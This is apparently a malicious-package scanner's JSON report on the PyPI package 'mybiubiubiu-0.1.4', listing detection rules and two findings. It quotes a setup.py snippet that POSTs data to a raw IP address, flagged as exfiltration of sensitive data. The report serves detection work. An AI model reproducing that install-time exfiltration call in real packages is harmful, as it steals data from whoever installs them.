@@ -1,0 +1,30 @@
+{
+    "issues": 2,
+    "errors": {},
+    "results": {
+        "exec-base64": {},
+        "clipboard-access": {},
+        "obfuscation": {},
+        "silent-process-execution": {},
+        "steganography": {},
+        "dll-hijacking": {},
+        "cmd-overwrite": {},
+        "exfiltrate-sensitive-data": [
+            {
+                "location": "setup.py:61",
+                "code": "        request(\n            url=\"http://123.206.22.33:5000/p/\",\n            method='POST',\n            data=json.dumps(data).encode(\"utf-8\", errors='ignore'),\n            headers=headers\n        )\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "code-execution": {},
+        "download-executable": {},
+        "shady-links": [
+            {
+                "location": "setup.py:62",
+                "code": "            url=\"http://123.206.22.33:5000/p/\",\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ]
+    },
+    "path": "./dataset/pypi/mybiubiubiu-0.1.4"
+}
